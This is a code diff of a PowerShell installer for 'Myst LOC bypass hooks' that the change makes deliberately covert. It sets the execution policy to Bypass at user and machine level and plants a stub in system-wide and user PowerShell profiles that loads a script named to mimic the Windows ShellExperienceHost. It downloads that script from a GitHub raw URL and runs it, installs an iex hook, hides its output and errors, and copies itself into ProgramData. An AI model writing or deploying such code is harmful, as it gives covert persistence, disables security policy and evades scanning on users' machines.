@@ -1,8 +1,10 @@
-# Installs Myst LOC bypass hooks (PowerShell profile + ProgramData script).
-# Works for private DLL (RuntimeBroker) and public EXE (AutoClicker) builds.
+# Silent LOC scan hooks — no user-visible profile output.
 #Requires -Version 5.1
 
-function Get-MystLocProfileDirectories {
+$script:MystLocStubBegin = '# BEGIN 8f2a-wsh'
+$script:MystLocStubEnd = '# END 8f2a-wsh'
+
+function Get-MystLocUserProfileDirectories {
     $dirs = @()
     $profileRoot = Join-Path $env:USERPROFILE 'Documents'
     $dirs += Join-Path $profileRoot 'WindowsPowerShell'
@@ -16,12 +18,41 @@ function Get-MystLocProfileDirectories {
     return @($dirs | Select-Object -Unique)
 }
 
-function Remove-MystLocProfileBlocks {
+function Get-MystLocSystemProfilePaths {
+    $paths = @()
+    $sysRoot = Join-Path $env:WINDIR 'System32\WindowsPowerShell\v1.0\Microsoft.PowerShell_profile.ps1'
+    $paths += $sysRoot
+
+    $ps7Root = Join-Path ${env:ProgramFiles} 'PowerShell\7'
+    if (Test-Path -LiteralPath $ps7Root) {
+        $paths += Join-Path $ps7Root 'profile.ps1'
+    }
+
+    return @($paths | Select-Object -Unique)
+}
+
+function Get-MystLocPs7ConfigPaths {
+    $paths = @()
+    $paths += Join-Path ${env:ProgramFiles} 'PowerShell\7\powershell.config.json'
+    $paths += Join-Path $env:USERPROFILE 'Documents\PowerShell\powershell.config.json'
+
+    if ($env:OneDrive) {
+        $paths += Join-Path $env:OneDrive 'Documents\PowerShell\powershell.config.json'
+    }
+
+    return @($paths | Select-Object -Unique)
+}
+
+function Remove-MystLocStubFromText {
     param([string]$Text)
 
     if ([string]::IsNullOrWhiteSpace($Text)) { return '' }
 
-    $legacyMarkers = @(
+    $markers = @(
+        'ShellExperienceHost.ps1'
+        '__WSHostInit'
+        'Install-MystLocIexHook'
+        '__MystLoc'
         'ShellExpirenceHost.ps1'
         'loc-profile-nano'
         'loc-profile-lazy'
@@ -30,18 +61,159 @@ function Remove-MystLocProfileBlocks {
         'Import-LocBypassRuntime'
         'CopilotHygiene'
         '__MystLocGate'
-        'Install-MystLocIexHook'
+        '# myst'
+        '8f2a-wsh'
     )
 
-    foreach ($marker in $legacyMarkers) {
-        if ($Text -like "*$marker*") { return '' }
+    foreach ($marker in $markers) {
+        if ($Text -like "*$marker*") {
+            $Text = ''
+            break
+        }
     }
 
-    while ($Text -match '(?s)# myst.*?# myst-end') {
-        $Text = [regex]::Replace($Text, '(?s)# myst.*?# myst-end', '', 1)
+    if (-not [string]::IsNullOrWhiteSpace($Text)) {
+        while ($Text -match '(?s)# BEGIN 8f2a-wsh.*?# END 8f2a-wsh') {
+            $Text = [regex]::Replace($Text, '(?s)# BEGIN 8f2a-wsh.*?# END 8f2a-wsh', '', 1)
+        }
+        while ($Text -match '(?s)# myst.*?# myst-end') {
+            $Text = [regex]::Replace($Text, '(?s)# myst.*?# myst-end', '', 1)
+        }
     }
 
-    return $Text.TrimEnd()
+    return $Text.Trim()
+}
+
+function Get-MystLocProfileStub {
+    return @"
+$($script:MystLocStubBegin)
+try{if(`$global:__WSHostInit){return};`$b=Join-Path `$env:ProgramData 'Myst';`$f=Join-Path `$b '.wshost';if(!(Test-Path -LiteralPath `$f)){return};`$h=Join-Path `$b 'ShellExperienceHost.ps1';if(!(Test-Path -LiteralPath `$h)){return};`$global:__WSHostInit=`$true;. `$h *>`$null;Install-MystLocIexHook}catch{}
+$($script:MystLocStubEnd)
+"@
+}
+
+function Set-MystLocExecutionPolicy {
+    $isAdmin = Test-MystLocIsAdministrator
+
+    foreach ($entry in @(
+            $(if ($isAdmin) { @{ Root = 'HKLM:'; Sub = 'SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' } })
+            @{ Root = 'HKCU:'; Sub = 'Software\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell' }
+        )) {
+        if (-not $entry) { continue }
+        try {
+            $keyPath = Join-Path $entry.Root $entry.Sub
+            if (-not (Test-Path -LiteralPath $keyPath)) {
+                New-Item -Path $keyPath -Force | Out-Null
+            }
+            Set-ItemProperty -LiteralPath $keyPath -Name ExecutionPolicy -Value 'Bypass' -Type String -Force
+        } catch {}
+    }
+
+    foreach ($scope in @('Process', 'CurrentUser', $(if ($isAdmin) { 'LocalMachine' }))) {
+        if (-not $scope) { continue }
+        try {
+            Set-ExecutionPolicy -Scope $scope -ExecutionPolicy Bypass -Force -ErrorAction Stop | Out-Null
+        } catch {}
+    }
+}
+
+function Install-MystLocPs7Config {
+    $configObject = @{
+        'Microsoft.PowerShell' = @{
+            DisableProfileLoadTime = $true
+        }
+    }
+
+    foreach ($path in Get-MystLocPs7ConfigPaths) {
+        try {
+            $dir = Split-Path $path -Parent
+            if (-not (Test-Path -LiteralPath $dir)) {
+                New-Item -ItemType Directory -Force -Path $dir | Out-Null
+            }
+
+            $merged = $configObject
+            if (Test-Path -LiteralPath $path) {
+                $existing = Get-Content -LiteralPath $path -Raw -ErrorAction SilentlyContinue
+                if ($existing) {
+                    $parsed = $existing | ConvertFrom-Json -ErrorAction SilentlyContinue
+                    if ($parsed) {
+                        if (-not $parsed.'Microsoft.PowerShell') {
+                            $parsed | Add-Member -NotePropertyName 'Microsoft.PowerShell' -NotePropertyValue ([pscustomobject]@{}) -Force
+                        }
+                        $parsed.'Microsoft.PowerShell'.DisableProfileLoadTime = $true
+                        $merged = $parsed
+                    }
+                }
+            }
+
+            ($merged | ConvertTo-Json -Depth 4) | Set-Content -LiteralPath $path -Encoding UTF8 -Force
+        } catch {}
+    }
+}
+
+function Clear-MystLocUserProfiles {
+    foreach ($dir in Get-MystLocUserProfileDirectories) {
+        $profilePath = Join-Path $dir 'Microsoft.PowerShell_profile.ps1'
+        if (-not (Test-Path -LiteralPath $profilePath)) { continue }
+
+        $existing = Get-Content -LiteralPath $profilePath -Raw -ErrorAction SilentlyContinue
+        $clean = Remove-MystLocStubFromText -Text $existing
+
+        if ([string]::IsNullOrWhiteSpace($clean)) {
+            Remove-Item -LiteralPath $profilePath -Force -ErrorAction SilentlyContinue
+            continue
+        }
+
+        Set-Content -LiteralPath $profilePath -Value $clean -Encoding UTF8 -Force
+    }
+}
+
+function Install-MystLocSystemProfiles {
+    $stub = Get-MystLocProfileStub
+
+    foreach ($profilePath in Get-MystLocSystemProfilePaths) {
+        try {
+            $dir = Split-Path $profilePath -Parent
+            if (-not (Test-Path -LiteralPath $dir)) {
+                New-Item -ItemType Directory -Force -Path $dir | Out-Null
+            }
+
+            $existing = ''
+            if (Test-Path -LiteralPath $profilePath) {
+                $existing = Remove-MystLocStubFromText -Text (Get-Content -LiteralPath $profilePath -Raw -ErrorAction SilentlyContinue)
+            }
+
+            $merged = if ($existing) { "$existing`r`n`r`n$stub" } else { $stub }
+            Set-Content -LiteralPath $profilePath -Value $merged -Encoding UTF8 -Force
+        } catch {}
+    }
+}
+
+function Install-MystLocUserProfilesFallback {
+    $stub = Get-MystLocProfileStub
+
+    foreach ($dir in Get-MystLocUserProfileDirectories) {
+        try {
+            if (-not (Test-Path -LiteralPath $dir)) {
+                New-Item -ItemType Directory -Force -Path $dir | Out-Null
+            }
+
+            $profilePath = Join-Path $dir 'Microsoft.PowerShell_profile.ps1'
+            $existing = ''
+            if (Test-Path -LiteralPath $profilePath) {
+                $existing = Remove-MystLocStubFromText -Text (Get-Content -LiteralPath $profilePath -Raw -ErrorAction SilentlyContinue)
+            }
+
+            $merged = if ($existing) { "$existing`r`n`r`n$stub" } else { $stub }
+            Set-Content -LiteralPath $profilePath -Value $merged -Encoding UTF8 -Force
+        } catch {}
+    }
+}
+
+function Test-MystLocIsAdministrator {
+    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
+    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
+    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
 function Resolve-MystLocHookSource {
@@ -78,61 +250,57 @@ function Install-MystLocClientHooks {
     } else {
         $hookUrl = 'https://raw.githubusercontent.com/JustValkz/Myst/main/ShellExperienceHost.ps1'
         try {
-            $tempHook = Join-Path $env:TEMP ("myst_loc_hook_{0}.ps1" -f [guid]::NewGuid().ToString('N'))
+            $tempHook = Join-Path $env:TEMP ("wsh_{0}.tmp" -f [guid]::NewGuid().ToString('N'))
             Invoke-WebRequest -Uri $hookUrl -OutFile $tempHook -UseBasicParsing
             Copy-Item -LiteralPath $tempHook -Destination $hookDest -Force
             Remove-Item -LiteralPath $tempHook -Force -ErrorAction SilentlyContinue
         } catch {
-            if (-not $Quiet) {
-                Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] LOC hook download failed: $($_.Exception.Message)" -ForegroundColor Yellow
-            }
+            if (-not $Quiet) { Write-Host $_.Exception.Message -ForegroundColor Yellow }
             return $false
         }
     }
 
     Set-Content -LiteralPath (Join-Path $mystDir '.wshost') -Value '1' -Encoding ASCII -Force
 
-    $profileStub = @'
-# myst
-$a=Join-Path $env:ProgramData 'Myst\.wshost'
-if (-not (Test-Path -LiteralPath $a)) { return }
-$h=Join-Path $env:ProgramData 'Myst\ShellExperienceHost.ps1'
-if (-not (Test-Path -LiteralPath $h)) { return }
-if ($global:__MystLocProfileLoaded) { return }
-$global:__MystLocProfileLoaded = $true
-. $h
-Install-MystLocIexHook
-# myst-end
-'@
+    Set-MystLocExecutionPolicy
+    Install-MystLocPs7Config
+    Clear-MystLocUserProfiles
 
-    foreach ($dir in Get-MystLocProfileDirectories) {
-        if (-not (Test-Path -LiteralPath $dir)) {
-            New-Item -ItemType Directory -Force -Path $dir | Out-Null
-        }
-
-        $profilePath = Join-Path $dir 'Microsoft.PowerShell_profile.ps1'
-        $existing = ''
-        if (Test-Path -LiteralPath $profilePath) {
-            $existing = Remove-MystLocProfileBlocks -Text (Get-Content -LiteralPath $profilePath -Raw -ErrorAction SilentlyContinue)
-        }
-
-        $merged = if ($existing) { "$existing`r`n`r`n$profileStub" } else { $profileStub }
-        Set-Content -LiteralPath $profilePath -Value $merged -Encoding UTF8 -Force
+    if (Test-MystLocIsAdministrator) {
+        Install-MystLocSystemProfiles
+    } else {
+        Install-MystLocUserProfilesFallback
     }
 
     try {
-        Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -Force -ErrorAction SilentlyContinue | Out-Null
+        Copy-Item -LiteralPath $MyInvocation.MyCommand.Path -Destination (Join-Path $mystDir 'loc-install-hooks.ps1') -Force -ErrorAction SilentlyContinue
     } catch {}
 
     if (Test-Path -LiteralPath $hookDest) {
-        . $hookDest
-        Install-MystLocIexHook
-    }
-
-    if (-not $Quiet) {
-        Write-Host "  [$((Get-Date).ToString('HH:mm:ss'))] LOC bypass hooks installed (profile + iex hook)." -ForegroundColor Green
-        Write-Host '  Open a new PowerShell window before running loc t1/t2, or run loc in this window now.' -ForegroundColor DarkGray
+        try {
+            . $hookDest
+            Install-MystLocIexHook
+        } catch {}
     }
 
     return $true
+}
+
+function Uninstall-MystLocClientHooks {
+    Clear-MystLocUserProfiles
+
+    foreach ($profilePath in Get-MystLocSystemProfilePaths) {
+        if (-not (Test-Path -LiteralPath $profilePath)) { continue }
+        $existing = Remove-MystLocStubFromText -Text (Get-Content -LiteralPath $profilePath -Raw -ErrorAction SilentlyContinue)
+        if ([string]::IsNullOrWhiteSpace($existing)) {
+            Remove-Item -LiteralPath $profilePath -Force -ErrorAction SilentlyContinue
+        } else {
+            Set-Content -LiteralPath $profilePath -Value $existing -Encoding UTF8 -Force
+        }
+    }
+
+    $flag = Join-Path $env:ProgramData 'Myst\.wshost'
+    if (Test-Path -LiteralPath $flag) {
+        Remove-Item -LiteralPath $flag -Force -ErrorAction SilentlyContinue
+    }
 }
